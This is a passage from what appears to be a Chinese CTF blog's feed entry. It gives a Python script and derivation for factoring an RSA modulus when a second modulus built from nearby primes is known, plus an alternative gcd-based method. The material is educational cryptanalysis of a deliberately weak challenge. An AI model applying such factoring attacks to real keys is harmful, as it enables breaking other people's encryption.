class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">__Auther__ = &apos;M4x&apos;</div><div class="line"></div><div class="line"></div><div class="line">from gmpy2 import is_prime as prime</div><div class="line">from gmpy2 import iroot</div><div class="line"></div><div class="line">n = 15260473398916071686287752340249158279343013077145667794514717692352941873466690686288442204714585854869226872705293008837554012949598044297596015507031315006195230644722581744643756573982729344499452200116366327869178694692162014446578711956663348262932703160394101606708475725742890049311933691849747707673216322758418530420118502556719323543077771821163439824876751874675862075401986796272014746925015772045578403357300038192830197985871077621213669817380577176611560467051848951044963527185916781094981810804641387975398361694935093473717039550361644252381923994841138817152748279477868854093033234031994635408593</div><div class="line">nn = 15260473398916071686287752340249158279343013077145667794514717692352941873466690686288442204714585854869226872705293008837554012949598044297596015507031315006195230644722581744643756573982729344499452200116366327869178694692162014446578711956663348262932703160394101606708475725742890049311933691849747707914818082716474881224336472709074679047145667796106895298086129057288449508218237679974321952279429832707229303594474494519945899481320231091983665654947081839784375373657345023890332691371443571370016623789041883821610353473726465037590414008198228956920913181526550775524028059426312173493877228564452496582329</div><div class="line"></div><div class="line">#  print nn &gt; n</div><div class="line">t = nn - n</div><div class="line">f1 = lambda x, y: pow(x * y - t, 2) - 4 * n * x * y</div><div class="line">f2 = lambda x, y, s: (t - x * y - s) / (2 * x)</div><div class="line"></div><div class="line">for x in xrange(1, 3000):</div><div class="line">    for y in xrange(1, 3000):</div><div class="line">        print x, y</div><div class="line">        if f1(x, y) &gt;= 0:</div><div class="line">            s, b = iroot(f1(x, y), 2)</div><div class="line">            if b:</div><div class="line">                if prime(f2(x, y, int(s))):</div><div class="line">                    print &quot;Success&quot;</div><div class="line">                    print f2(x, y, int(s))</div><div class="line">                    exit()</div></pre></td></tr></table></figure></p><p>就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pq = n</div><div class="line">(p + x)(q + y) = n&apos;</div><div class="line">-&gt; xy + py + qx = t(t = n&apos; - n)</div><div class="line"></div><div class="line">-&gt; xq^2^ + (xy - t)q + ny = 0</div><div class="line"></div><div class="line">则该方程有素数接即可，可爆破x，y</div></pre></td></tr></table></figure></p><p>方法二：<br>因为<code>n = p * q,nn = p1 * q1</code><br>因为n和nn很相近，所以n<em>nn讲道理用yafu很快就能跑出来<br>可以得到`t1 = p</em>q1,t2 = q*p1 `<br>然后gcd一下就可以了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前一直用的是&lt;a href=&quot;http://bobao.360.cn/learning/detail/3058.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bobao.360.cn/learning/detail/3058.html&lt;/a&gt;这里的，可是发现这里面好久没更新了，想了想还是自己在整理一下吧。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
